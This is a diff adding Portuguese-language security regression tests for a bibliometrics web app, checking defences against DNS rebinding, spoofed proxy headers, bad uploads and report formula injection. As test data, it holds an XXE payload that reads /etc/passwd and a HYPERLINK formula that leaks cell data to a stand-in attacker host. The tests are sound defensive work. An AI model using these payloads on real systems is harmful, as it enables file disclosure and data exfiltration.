@@ -298,3 +298,106 @@ def test_roteador_serve_so_a_biblioteca_empacotada(servidor):
     r = requests.get(base + "/vendor/chart-4.4.1.umd.js")
     assert r.status_code == 200 and r.headers["Content-Type"].startswith("application/javascript")
     assert requests.get(base + "/vendor/LICENSE-chartjs.md").status_code == 404
+
+
+# ---------------------------------------------------------------- rodada 3
+@precisa_php
+def test_dns_rebinding_host_externo_bloqueado(servidor):
+    """H1: navegador da vítima envia Host/Origin do domínio do atacante (que resolve para 127.0.0.1)."""
+    import requests
+    base, _ = servidor
+    porta = base.rsplit(":", 1)[1]
+    h = {"Host": f"atacante.example:{porta}"}
+    assert requests.get(base + "/", headers=h).status_code == 421
+    assert requests.get(base + "/triagem_rapida.php", headers=h).status_code == 421
+    r = requests.post(base + "/api.php?acao=criar_projeto", json={"nome": "rebind"},
+                      headers={**h, "Origin": f"http://atacante.example:{porta}"})
+    assert r.status_code == 421
+    assert requests.get(base + "/arquivo.php", headers=h).status_code == 421
+    for ok in (f"127.0.0.1:{porta}", f"localhost:{porta}"):
+        assert requests.get(base + "/", headers={"Host": ok}).status_code == 200
+
+
+@precisa_php
+@pytest.mark.parametrize("cabecalho", ["X-Forwarded-For", "X-Real-IP", "Forwarded", "X-Forwarded-Host"])
+def test_atras_de_proxy_reverso_exige_credenciais(servidor, cabecalho):
+    """H2: atrás de proxy no mesmo host REMOTE_ADDR é 127.0.0.1; o cabeçalho do proxy revela o cliente remoto."""
+    import requests
+    valor = "for=203.0.113.9" if cabecalho == "Forwarded" else "203.0.113.9"
+    assert requests.get(servidor[0] + "/", headers={cabecalho: valor}).status_code == 403
+
+
+@precisa_php
+def test_triagem_rapida_valida_conteudo(servidor, tmp_path):
+    """H3: a triagem rápida aplica a mesma validação de conteúdo da importação."""
+    base, _ = servidor
+    s, _ = _sessao(base)
+    r = s.post(base + "/run_pipeline.php", data={"params": "{}"},
+               files={"files[]": ("lens-export.csv", b"\x00\x01binario")})
+    assert r.status_code == 422 and "bytes nulos" in r.json()["erro"]
+    xlsx = tmp_path / "x.xlsx"
+    with zipfile.ZipFile(xlsx, "w") as z:
+        z.writestr("[Content_Types].xml", "<Types/>")
+        z.writestr("xl/worksheets/sheet1.xml", '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM '
+                   '"file:///etc/passwd">]><worksheet>&e;</worksheet>')
+    r = s.post(base + "/run_pipeline.php", data={"params": "{}"}, files={"files[]": ("lens-export.xlsx", xlsx.read_bytes())})
+    assert r.status_code == 422 and "DOCTYPE" in r.json()["erro"]
+
+
+def test_xlsx_com_doctype_rejeitado(tmp_path):
+    p = tmp_path / "lol.xlsx"
+    with zipfile.ZipFile(p, "w") as z:
+        z.writestr("[Content_Types].xml", "<Types/>")
+        z.writestr("xl/worksheets/sheet1.xml", '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "a">]><w>&a;</w>')
+    with pytest.raises(ArquivoInvalido, match="DOCTYPE"):
+        validar_conteudo(p)
+    import openpyxl
+    assert openpyxl.DEFUSEDXML is True
+
+
+@pytest.mark.parametrize("campos", [{"nome": "x" * 201}, {"nome": ""}, {"descricao": 1}, {"fontes_bibliograficas": "Lens"},
+                                    {"fontes_bibliograficas": ["x"] * 51}, {"configuracao_padrao": {"modo": "inventado"}},
+                                    {"configuracao_padrao": {"modo": "original", "pesos": [1, 0, 0, 0]}},
+                                    {"slug": "outro"}, {"criado_em": "2000"}])
+def test_atualizar_projeto_valida_campos(proj, campos):
+    """H4: metadados editáveis com tipo, tamanho e chaves controlados (slug e datas não editáveis)."""
+    antes = proj.info
+    with pytest.raises(ValueError):
+        proj.atualizar(**campos)
+    assert proj.info == antes
+
+
+def test_relatorios_sem_injecao_de_formulas(proj, tmp_path):
+    """H5: título iniciado por '=' não vira fórmula no XLSX nem no CSV de relatório; dado bruto preservado."""
+    import openpyxl
+    import pandas as pd
+    titulo = '=HYPERLINK("http://atacante.example/?d="&A2,"Flood forecasting with LSTM")'
+    pd.DataFrame({"Title": [titulo, "Flood prediction using random forest"], "Publication Year": [2020, 2021],
+                  "Abstract": ["flood forecasting deep learning rainfall river"] * 2, "Keywords": ["", ""],
+                  "Citing Works Count": [5, 1], "DOI": ["10.1000/f1", "10.1000/f2"], "Source Title": ["W", "W"]}
+                 ).to_csv(tmp_path / "lens-export.csv", index=False)
+    proj.importar(tmp_path / "lens-export.csv")
+    r = proj.executar(Config.original(), n_sensibilidade=0, graficos_=False, revisao_duplicatas=False)
+    pasta = pathlib.Path(r["pasta"])
+    ws = openpyxl.load_workbook(pasta / "relatorios" / "resultados.xlsx")["corpus"]
+    celulas = [c for linha in ws.iter_rows() for c in linha if isinstance(c.value, str) and c.value.startswith("=")]
+    assert celulas and all(c.data_type == "s" for c in celulas)
+    csv_rel = (pasta / "relatorios" / "csv" / "corpus.csv").read_text(encoding="utf-8")
+    assert "'=HYPERLINK" in csv_rel
+    assert titulo in pd.read_csv(pasta / "corpus.csv")["title"].tolist()     # bruto intacto (hash do manifesto)
+    assert proj.verificar_execucao(r["id"])["ok"]
+
+
+@pytest.mark.parametrize("var,valor,msg", [("CIENTOMETRIA_TEMPO_MAX_S", "1", "tempo máximo"),
+                                           ("CIENTOMETRIA_MEMORIA_MAX_MB", "150", "MemoryError")])
+def test_limites_de_recursos(tmp_path, var, valor, msg):
+    """H6: processos iniciados pela web têm teto de tempo e memória."""
+    import json
+    import sys
+    pasta = gerar(str(tmp_path / "b"), n=3000)
+    payload = tmp_path / "p.json"
+    payload.write_text(json.dumps({"files": [str(p) for p in sorted(pathlib.Path(pasta).glob("*.csv"))],
+                                   "params": {"modo": "original", "n_sensibilidade": 20000}}))
+    r = subprocess.run([sys.executable, str(RAIZ / "scripts" / "pipeline.py"), str(payload)], capture_output=True,
+                       text=True, env=dict(os.environ, **{var: valor}), timeout=120)
+    assert r.returncode != 0 and msg in r.stderr
